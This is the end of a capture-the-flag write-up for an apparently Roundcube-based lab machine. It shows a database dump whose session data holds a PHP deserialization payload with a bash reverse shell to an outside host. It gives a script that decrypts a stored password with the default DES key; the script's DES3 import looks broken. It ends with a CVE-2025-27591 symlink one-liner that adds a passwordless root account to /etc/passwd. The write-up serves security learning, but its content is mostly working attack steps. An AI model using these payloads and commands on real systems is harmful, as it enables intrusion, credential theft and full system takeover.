    ('6a5ktqih5uca6lj8vrmgh9v0oh','2025-06-08 15:46:40','172.17.0.1','bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7'),
    ('94gpngmgjl9lnb083mic69vufm','2025-07-25 12:35:16','172.17.0.1','bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6IlEvd2FPQ1JFVjI0NTI2ZnM5UkdvUVFpWk1nN0tqdDNkIjtsb2dpbl90aW1lfGk6MTc1MzQ0NjkxNjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiI5a01GeHpmUjB5OEZpVFliRjhyNTJ6MlJkZCI7cmVxdWVzdF90b2tlbnxzOjMyOiJtRFhLeldJTWZwVTR6Q1A1N1pkSTFIUjJEdXN3eERpVSI7cGx1Z2luc3xhOjE6e3M6MjI6ImZpbGVzeXN0ZW1fYXR0YWNobWVudHMiO2E6MTp7czoxNTc6IiEiO2k6MDtPOjE2OiJDcnlwdF9HUEdfRW5naW5lIjoxOntTOjI2OiJcMDBDcnlwdF9HUEdfRW5naW5lXDAwX2dwZ2NvbmYiO1M6NTc6Ii9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+IC9kZXYvdGNwLzEwXDJlMTBcMmUxNFwyZTExLzEyMzQgMD4mMSc7IyI7fWk6MDtiOjA7fSI7fX0iO2E6MTp7czoyMDoiMzE3NTM0NDY5MTYwNTMzMDY1MDAiO3M6NjQ6Ii92YXIvd3d3L2h0bWwvcm91bmRjdWJlL3RlbXAvUkNNVEVNUGF0dG1udDY4ODM3YTA0ODIxM2QzNDU3ODg3MTEiO319fSI7aTowO086MTY6IkNyeXB0X0dQR19FbmdpbmUiOjE6e1M6MjY6IlwwMENyeXB0X0dQR19FbmdpbmVcMDBfZ3BnY29uZiI7Uzo1NzoiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTBcMmUxMFwyZTE0XDJlMTEvMTIzNCAwPiYxJzsjIjt9aTowO2I6MDt9Ijt9fXxOOzE6e3M6NToiZmlsZXMiO2E6MTp7czoyMDoiMzE3NTM0NDY5MTYwNTMzMDY1MDAiO2E6Njp7czo0OiJwYXRoIjtzOjY0OiIvdmFyL3d3dy9odG1sL3JvdW5kY3ViZS90ZW1wL1JDTVRFTVBhdHRtbnQ2ODgzN2EwNDgyMTNkMzQ1Nzg4NzExIjtzOjQ6InNpemUiO2k6ODk7czo0OiJuYW1lIjtzOjY1OiJ4fGI6MDtwcmVmZXJlbmNlc190aW1lfGI6MDtwcmVmZXJlbmNlc3xzOjIyNDoiYTozOntpOjA7czo1NzoiLnBuZyI7czo4OiJtaW1ldHlwZSI7czo5OiJpbWFnZS9wbmciO3M6NToiZ3JvdXAiO3M6MTU3OiIhIjtpOjA7TzoxNjoiQ3J5cHRfR1BHX0VuZ2luZSI6MTp7UzoyNjoiXDAwQ3J5cHRfR1BHX0VuZ2luZVwwMF9ncGdjb25mIjtTOjU3OiIvYmluL2Jhc2ggLWMgJ2Jhc2ggLWkgPiAvZGV2L3RjcC8xMFwyZTEwXDJlMTRcMmUxMS8xMjM0IDA+JjEnOyMiO31pOjA7YjowO30iOw==');
    /*!40000 ALTER TABLE `session` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `system`
    --
    
    DROP TABLE IF EXISTS `system`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `system` (
      `name` varchar(64) NOT NULL,
      `value` mediumtext DEFAULT NULL,
      PRIMARY KEY (`name`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `system`
    --
    
    LOCK TABLES `system` WRITE;
    /*!40000 ALTER TABLE `system` DISABLE KEYS */;
    INSERT INTO `system` VALUES
    ('roundcube-version','2022081200');
    /*!40000 ALTER TABLE `system` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `users`
    --
    
    DROP TABLE IF EXISTS `users`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8mb4 */;
    CREATE TABLE `users` (
      `user_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `username` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
      `mail_host` varchar(128) NOT NULL,
      `created` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
      `last_login` datetime DEFAULT NULL,
      `failed_login` datetime DEFAULT NULL,
      `failed_login_counter` int(10) unsigned DEFAULT NULL,
      `language` varchar(16) DEFAULT NULL,
      `preferences` longtext DEFAULT NULL,
      PRIMARY KEY (`user_id`),
      UNIQUE KEY `username` (`username`,`mail_host`)
    ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `users`
    --
    
    LOCK TABLES `users` WRITE;
    /*!40000 ALTER TABLE `users` DISABLE KEYS */;
    INSERT INTO `users` VALUES
    (1,'jacob','localhost','2025-06-07 13:55:18','2025-06-11 07:52:49','2025-06-11 07:51:32',1,'en_US','a:1:{s:11:\"client_hash\";s:16:\"hpLLqLwmqbyihpi7\";}'),
    (2,'mel','localhost','2025-06-08 12:04:51','2025-06-08 13:29:05',NULL,NULL,'en_US','a:1:{s:11:\"client_hash\";s:16:\"GCrPGMkZvbsnc3xv\";}'),
    (3,'tyler','localhost','2025-06-08 13:28:55','2025-07-25 12:35:16','2025-06-11 07:51:22',1,'en_US','a:2:{s:11:\"client_hash\";s:16:\"S7p4Q4gBcZnjjbQM\";i:0;b:0;}');
    /*!40000 ALTER TABLE `users` ENABLE KEYS */;
    UNLOCK TABLES;
    /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
    
    /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
    /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
    /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
    /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
    /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
    /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
    /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
    
    -- Dump completed on 2025-07-25 12:41:13
    ```

create venv and install dependencies:

```
python3 -m venv venv
venv/bin/pip install pycryptodome
```

```python
import DES3
from Crypto.Util.Padding import unpad
import base64

# Your data
key = b'rcmail-!24ByteDESkey*Str'
b64_ciphertext = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'

# Decode and split IV + actual ciphertext
data = base64.b64decode(b64_ciphertext)
iv = data[:8]
ciphertext = data[8:]

# Decrypt with CBC mode
cipher = DES3.new(key, DES3.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), DES3.block_size)

print("Decrypted password:", plaintext.decode())
```

run with `venv/bin/python script.py`.

`su jacob` with `595mO8DmwGeD`.

When we check the root path (`/`) we see .dockerenv - we are in docker.

Go to the web service - roundcube and check the mails. We see info about `Below` and an email with password `gY4Wr3a1evp4`.

Let's try to SSH as jacob with the password from mail.

## root

`below` can be executed under sudo. (`sudo -l`)

cve: https://www.facebook.com/security/advisories/cve-2025-27591

exploit: https://github.com/BridgerAlderson/CVE-2025-27591-PoC

one-liner:
```
rm /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo below record || true && echo "attacker::0:0:attacker:/root:/bin/bash" >> /var/log/below/error_root.log && su attacker
```

just a POC to see how it works—it changes the permissions of the target file:
```
rm /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo below record || true && ls -al /etc/passwd

```
